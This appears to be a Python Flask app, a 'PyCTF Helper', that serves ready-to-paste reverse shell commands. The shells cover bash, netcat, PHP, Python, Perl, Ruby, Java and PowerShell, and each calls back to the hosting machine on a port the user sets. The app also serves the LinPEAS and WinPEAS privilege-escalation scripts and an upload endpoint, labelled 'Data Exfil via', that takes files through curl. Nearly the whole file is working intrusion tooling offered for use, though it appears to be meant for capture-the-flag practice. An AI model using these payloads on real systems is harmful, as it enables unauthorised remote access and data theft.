import os
from flask import Flask, render_template, request, redirect, url_for
from werkzeug.utils import secure_filename

def create_app(test_config=None):
    app = Flask(__name__, static_url_path='')
    uploaddir = 'uploads/'
    prefered_port = '4444'

    @app.route('/linpeas')
    @app.route('/linpeas.sh')
    def linpeas():
        return app.send_static_file('linpeas.sh')

    @app.route('/winpeas')
    @app.route('/winpeas.bat')
    def winpeas():
        return app.send_static_file('winPEAS.bat')

    @app.route('/')
    def help():
        hostname = (request.host).split(':')[0]
        rport = prefered_port
        return '''
    <html>
        <head>
            <title>PyCTF Helper</title>
        </head>
        <body>
            <h1>PyCTF Helper</h1>
            <h3>Reverse Shells</h3>
            <p>This site allows quick copy/paste / download of reverse shell commands</p>
            <ul>
                <li><a href="/bash">bash</a>
                <ul>
                    bash -i >& /dev/tcp/''' + hostname + '/' + rport + ''' 0>&1
                </ul>
                </li>
                <li><a href="/netcat">netcat</a><ul>
                    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ''' + hostname + ' ' + rport + ''' >/tmp/f'
                </ul>
                </li>
                <li><a href="/php">php</a><ul>
                    php -r '$sock=fsockopen("''' + hostname + '''",''' + rport + ''');exec("/bin/sh -i <&3 >&3 2>&3");
                </ul>
                </li>
                <li><a href="/python">python</a><ul>
                    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'''+hostname+'''",'''+rport+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
                </ul>
                </li>
                <li><a href="/perl">perl</a><ul>
                    perl -e 'use Socket;$i="'''+hostname+'''";$p='''+rport+''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
                </ul>
                </li>
                <li><a href="/ruby">ruby</a><ul>
                    ruby -rsocket -e'f=TCPSocket.open("'''+hostname+'''",'''+rport+''').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
                </ul>
                </li>
                <li><a href="/java">java</a><ul>
                    r = Runtime.getRuntime()
                    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'''+hostname+'''/'''+rport+''';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
                    p.waitFor()
                </ul>
                </li>
                <li><a href="/powershell">powershell</a><ul>
                    powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\''''+hostname+'''','''+rport+''');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'"
                </ul>
                </li>
            </ul>
            <p><b>e.g.</b><br /> <a href="''' + request.url + '''bash">''' + request.url + '''bash</a></p>
            <p>If you want to change that port simply add '/port' to the end of the url<p>
            <p><b>e.g.</b><br /> <a href="''' + request.url + '''bash/1337">''' + request.url + '''bash/1337</a></p>
            <p>If you want to change the default port then edit the python script and change the vaiable 'prefered_port'</p>
            <h3>PrivEsc</h3>
            PrivEsc scripts
            <ul>
                <li><a href="/linpeas.sh">LinPeas.sh</a></li>
                <li><a href="/winPEAS.bat">WinPeas.bat</a></li>
            </ul>
            <h3>Uploads</h3>
            <p>You can also upload files via <a href="/upload">/upload</a></p>

        </body>
    </html>

    '''

    @app.route('/upload', methods=['GET', 'POST'])
    def upload_file():
        hostname = (request.host).split(':')[0]
        if request.method == 'POST':
            print("POST")
            file = request.files['file']
            print("file" + file.filename)
            filename = secure_filename(file.filename)
            file.save( uploaddir + request.remote_addr + '_' + filename)
            return 'Uploaded to ' + uploaddir + request.remote_addr + '_' + filename
        return '''
        <!doctype html>
        <title>''' + hostname + '''Upload new File</title>
        <h1>Upload new File</h1>
        <form method=post enctype=multipart/form-data>
        <input type=file name=file>
        <input type=submit value=Upload>
        </form>
        <h3>Data Exfil via</h3>
        <pre>curl -F 'file=@<i>&lt;filename&gt;</i>' ''' + request.url + '''</pre>
        <p>If you want to change the default upload directory then edit the python script and change the vaiable 'upload_dir'</p>
        '''

    @app.route('/bash', defaults={'rport': prefered_port})
    @app.route('/bash/<string:rport>')
    def bash(rport):
        hostname = (request.host).split(':')[0]
        return 'bash -i >& /dev/tcp/' + hostname + '/' + rport + ' 0>&1'

    @app.route('/nc', defaults={'rport': prefered_port})
    @app.route('/nc/<string:rport>')
    def nc(rport):
        hostname = (request.host).split(':')[0]
        return 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + hostname + ' ' + rport + ' >/tmp/f'

    @app.route('/netcat', defaults={'rport': prefered_port})
    @app.route('/netcat/<string:rport>')
    def netcat(rport):
        hostname = (request.host).split(':')[0]
        return 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + hostname + ' ' + rport + ' >/tmp/f'

    @app.route('/php', defaults={'rport': prefered_port})
    @app.route('/php/<string:rport>')
    def php(rport):
        hostname = (request.host).split(':')[0]
        return '''php -r '$sock=fsockopen("''' + hostname + '''",''' + rport + ''');exec("/bin/sh -i <&3 >&3 2>&3");'''

    @app.route('/python', defaults={'rport': prefered_port})
    @app.route('/python/<string:rport>')
    def python(rport):
        hostname = (request.host).split(':')[0]
        return '''
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'''+hostname+'''",'''+rport+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    '''
    @app.route('/py', defaults={'rport': prefered_port})
    @app.route('/py/<string:rport>')
    def py(rport):
        hostname = (request.host).split(':')[0]
        return '''
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'''+hostname+'''",'''+rport+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    '''
    @app.route('/perl', defaults={'rport': prefered_port})
    @app.route('/perl/<string:rport>')
    def perl(rport):
        hostname = (request.host).split(':')[0]
        return '''
    perl -e 'use Socket;$i="'''+hostname+'''";$p='''+rport+''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    '''
    @app.route('/pl', defaults={'rport': prefered_port})
    @app.route('/pl/<string:rport>')
    def pl(rport):
        hostname = (request.host).split(':')[0]
        return '''
    perl -e 'use Socket;$i="'''+hostname+'''";$p='''+rport+''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    '''
    @app.route('/ruby', defaults={'rport': prefered_port})
    @app.route('/ruby/<string:rport>')
    def ruby(rport):
        hostname = (request.host).split(':')[0]
        return '''
    ruby -rsocket -e'f=TCPSocket.open("'''+hostname+'''",'''+rport+''').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    '''
    @app.route('/java', defaults={'rport': prefered_port})
    @app.route('/java/<string:rport>')
    def java(rport):
        hostname = (request.host).split(':')[0]
        return '''
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'''+hostname+'''/'''+rport+''';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
    '''

    @app.route('/powershell', defaults={'rport': prefered_port})
    @app.route('/powershell/<string:rport>')
    def powershell(rport):
        hostname = (request.host).split(':')[0]
        return '''
    powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\''''+hostname+'''','''+rport+''');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'"
    '''
    @app.route('/ps', defaults={'rport': prefered_port})
    @app.route('/ps/<string:rport>')
    def ps(rport):
        hostname = (request.host).split(':')[0]
        return '''
    powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\''''+hostname+'''','''+rport+''');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'"
    '''

    return app
